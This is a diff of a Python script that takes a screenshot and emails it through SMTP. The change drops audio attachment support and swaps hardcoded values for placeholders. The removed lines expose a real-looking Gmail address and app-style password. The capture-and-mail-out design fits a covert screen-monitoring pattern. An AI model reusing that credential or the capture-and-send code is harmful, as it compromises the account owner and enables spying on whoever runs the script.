@@ -6,7 +6,6 @@ import smtplib
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.image import MIMEImage
-from email.mime.audio import MIMEAudio
 
 def take_screenshot_and_send_email():
     try:
@@ -20,17 +19,17 @@ def take_screenshot_and_send_email():
         screenshot.save(image_filepath)
 
         # Send the screenshot and audio via email
-        sender_email = "computerarbaz@gmail.com"  
-        sender_password = "giab ytbb pmue sgjw" 
-        recipient_email = "computerarbaz@gmail.com"  
-        subject = "Screenshot and Audio"
+        sender_email = "sender_email"  
+        sender_password = "sender_password" 
+        recipient_email = "recipient_email"  
+        subject = "Screenshot"
 
         msg = MIMEMultipart()
         msg['From'] = sender_email
         msg['To'] = recipient_email
         msg['Subject'] = subject
 
-        text = MIMEText("Here is the screenshot and audio.")
+        text = MIMEText("Here is the screenshot.")
         msg.attach(text)
 
         # Attach the screenshot
